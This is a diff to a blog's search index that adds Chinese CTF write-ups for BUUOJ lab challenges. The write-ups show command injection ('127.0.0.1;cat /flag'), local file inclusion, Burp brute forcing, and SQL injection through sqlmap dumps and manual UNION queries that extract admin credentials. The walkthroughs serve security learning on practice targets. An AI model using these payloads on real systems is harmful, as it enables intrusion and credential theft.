@@ -20,9 +20,9 @@
       
         <tags>
             
-            <tag> CTF实战 </tag>
-            
             <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
             
             <tag> 文件上传 </tag>
             
@@ -49,11 +49,11 @@
       
         <tags>
             
+            <tag> web安全 </tag>
+            
             <tag> CTF实战 </tag>
             
             <tag> 文件包含 </tag>
-            
-            <tag> web安全 </tag>
             
         </tags>
       
@@ -182,6 +182,35 @@
     
     
     <entry>
+      <title>web-buuoj-[ACTF2020 新生赛]Exec</title>
+      <link href="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/"/>
+      <url>/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.04.46.png" style="zoom:50%;"><ul><li>初步分析</li></ul><p>页面体现出来的功能是让我们给一个ip地址然后通过ping命令测试连通性。</p><p>既然要使用ping命令那么必然会调用底层操作系统的命令，如果是简单的拼接用户的输入，那么就会造成命令执行漏洞。</p><h1 id="二、解题"><a href="#二、解题" class="headerlink" title="二、解题"></a>二、解题</h1><ul><li>漏洞测试</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.07.02.png" style="zoom:50%;"><p>可以看到回显出了当前目录下的文件<code>index.php</code></p><p>说明在执行完<code>ping 127.0.0.1</code>之后又执行了ls命令，存在命令执行漏洞。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span> /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.09.37.png" style="zoom:50%;"><p>可以看到flag在根目录下。</p><ul><li>获取flag</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">cat</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-exec/%E6%88%AA%E5%B1%8F2025-02-11%2019.10.37.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>e347ca3a-317b-4f7f-8367-302b6e2eea21<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本关考察的是最最基础的命令执行漏洞的情况，通过<code>;</code>后接系统命令即可达到执行任意命令的目的。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>web-buuoj-(BUU XSS COURSE1)</title>
       <link href="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/"/>
       <url>/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/</url>
@@ -198,9 +227,9 @@
       
         <tags>
             
-            <tag> CTF实战 </tag>
-            
             <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
             
             <tag> 跨站脚本攻击 </tag>
             
@@ -258,11 +287,98 @@
       
         <tags>
             
+            <tag> web安全 </tag>
+            
             <tag> 文件包含 </tag>
+            
+            <tag> 漏洞知识库 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web-buuoj-(BUU LFI COURSE1)</title>
+      <link href="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/"/>
+      <url>/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2025-02-11%2019.35.37.png" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2024-11-15%2017.49.27.png" alt="截屏2024-11-15 17.49.27" style="zoom:50%;"><h1 id="二、考点"><a href="#二、考点" class="headerlink" title="二、考点"></a>二、考点</h1><p>基础文件包含漏洞。</p><h1 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h1><ul><li>payload</li></ul><pre class="line-numbers language-none"><code class="language-none">?file=/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>解题</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2024-11-15%2017.50.17.png" alt="截屏2024-11-15 17.50.17"></p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-lfi-course1/%E6%88%AA%E5%B1%8F2024-11-15%2017.51.02.png" alt="截屏2024-11-15 17.51.02" style="zoom:50%;"><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-none"><code class="language-none">flag{1d8059c2-58c4-4257-9afa-d268d7aa2698}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
             
             <tag> web安全 </tag>
             
-            <tag> 漏洞知识库 </tag>
+            <tag> CTF实战 </tag>
+            
+            <tag> 文件包含漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web-buuoj-(BUU BRUTE 1)</title>
+      <link href="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/"/>
+      <url>/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.09.35.png" alt="截屏2024-11-18 18.09.35" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.09.57.png" alt="截屏2024-11-18 18.09.57" style="zoom:50%;"><h2 id="二、考点"><a href="#二、考点" class="headerlink" title="二、考点"></a>二、考点</h2><p>BurpSuite-intruder爆破模块的简单使用。</p><h3 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h3><p>通过手动测试，发现用户名为admin、密码为4位数字，进一步缩小爆破范围。</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.31.16.png" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.31.39.png" style="zoom:50%;"><p>配置BP intruder模块。</p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.11.11.png" alt="截屏2024-11-18 18.11.11"></p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.23.03.png" alt="截屏2024-11-18 18.23.03" style="zoom:40%;"><p>成功爆破出flag</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-brute-1/%E6%88%AA%E5%B1%8F2024-11-18%2018.25.08.png" alt="截屏2024-11-18 18.25.08" style="zoom:50%;"><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-none"><code class="language-none">flag{d6bcba07-41d6-4585-894c-d766e3f7646a}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> 暴力破解 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web-buuoj-(BUU SQL COURSE 1)</title>
+      <link href="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/"/>
+      <url>/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.20.41.png" style="zoom:50%;"><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.18.51.png" alt="截屏2024-11-22 17.18.51"></p><h1 id="二、考点"><a href="#二、考点" class="headerlink" title="二、考点"></a>二、考点</h1><p>基础的sql注入。</p><h1 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h1><p>对关键的数据库请求抓包。</p><p>对关键的数据库请求抓包。</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.19.59-2267207.png" alt="截屏2024-11-22 17.19.59" style="zoom:50%;"><p>根据抓包内容拼接完整的请求url：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.21.59.png" alt="截屏2024-11-22 17.21.59"></p><h2 id="3-1-sqlmap"><a href="#3-1-sqlmap" class="headerlink" title="3.1 sqlmap"></a>3.1 sqlmap</h2><ul><li>列出数据库</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.25.35-2267540.png" alt="截屏2024-11-22 17.25.35" style="zoom:50%;"><ul><li>指定数据库名，列出表名</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> news <span class="token parameter variable">--tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.27.01-2267625.png" alt="截屏2024-11-22 17.27.01" style="zoom:50%;"><ul><li>指定表名，列出字段名</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> news <span class="token parameter variable">-T</span> admin <span class="token parameter variable">--columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.27.49-2267673.png" alt="截屏2024-11-22 17.27.49" style="zoom:50%;"><ul><li>列出数据表的数据</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php<span class="token punctuation">\</span>?id<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> news <span class="token parameter variable">-T</span> admin <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.22.50.png" style="zoom:80%;"><p>838862827662e69881102efeb9b35cbd 可能是hash值，但也可能就是原始的密码。</p><p>登录，获得flag。</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.30.33.png" alt="截屏2024-11-22 17.30.33" style="zoom:50%;"><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.31.00-2267865.png" alt="截屏2024-11-22 17.31.00" style="zoom:50%;"><h2 id="3-2-手工注入"><a href="#3-2-手工注入" class="headerlink" title="3.2 手工注入"></a>3.2 手工注入</h2><ul><li>注入点判断：（注入点的位置和注入的手法）</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.32.20.png" alt="截屏2024-11-22 17.32.00"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.32.49.png" alt="截屏2024-11-22 17.32.49"></p><p>存在sql注入漏洞，且存在布尔状态，可以进行布尔盲注。</p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.35.04.png" alt="截屏2024-11-22 17.35.04"></p><p>存在时延状态，可以进行时间盲注。</p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.36.38.png" alt="截屏2024-11-22 17.36.38"></p><p>没有报错信息，可能无法进行报错注入。</p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.37.28.png" alt="截屏2024-11-22 17.37.28" style="zoom:50%;"><p>存在sql注入漏洞的情况下， 存在回显，有先考虑联合查询注入。</p><ul><li>判断字段个数</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.39.18.png" alt="截屏2024-11-22 17.39.18"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.39.43.png" alt="截屏2024-11-22 17.39.43"></p><p>字段个数为2.</p><ul><li>回显位置</li></ul><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.40.30.png" alt="截屏2024-11-22 17.40.30"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.40.58.png" alt="截屏2024-11-22 17.40.58"></p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2025-02-11%2019.25.04.png" style="zoom:50%;"><p>数据库为mysql。</p><ul><li>获取表名</li></ul><pre class="line-numbers language-none"><code class="language-none">http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id=-1%20union%20select%20table_name,version()%20from%20information_schema.tables%20where%20table_schema=database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.43.46.png" alt="截屏2024-11-22 17.43.46"></p><p>表名：admin</p><ul><li>获取字段名</li></ul><pre class="line-numbers language-none"><code class="language-none">db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id=-1 union select group_concat(column_name),version() from information_schema.columns where table_schema=database() and table_name='admin' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.47.39.png" alt="截屏2024-11-22 17.47.39"></p><ul><li>获取值</li></ul><pre class="line-numbers language-none"><code class="language-none">http://db613a34-4b93-493c-8e67-40e7720a79b8.node5.buuoj.cn:81/backend/content_detail.php?id=-1%20union%20select%20group_concat(username,password),version()%20from%20admin--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.49.07-2268952.png" alt="截屏2024-11-22 17.49.07"></p><p><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.49.54.png" alt="截屏2024-11-22 17.49.54"></p><p>密码：838862827662e69881102efeb9b35cbd</p><ul><li>登录获取flag</li></ul><img src="/2025/02/08/ctf-shi-zhan/web-buuoj-buu-sql-course-1/%E6%88%AA%E5%B1%8F2024-11-22%2017.50.38-2269044.png" alt="截屏2024-11-22 17.50.38" style="zoom: 33%;"><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-none"><code class="language-none">flag{8d21ee6f-7b64-4895-961f-d120a205302c}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> sql注入 </tag>
             
         </tags>
       
@@ -550,11 +666,11 @@
       
         <tags>
             
-            <tag> 内网攻防 </tag>
-            
             <tag> 攻防工具库 </tag>
             
             <tag> 内网扫描 </tag>
+            
+            <tag> 内网攻防 </tag>
             
             <tag> fscan </tag>
             
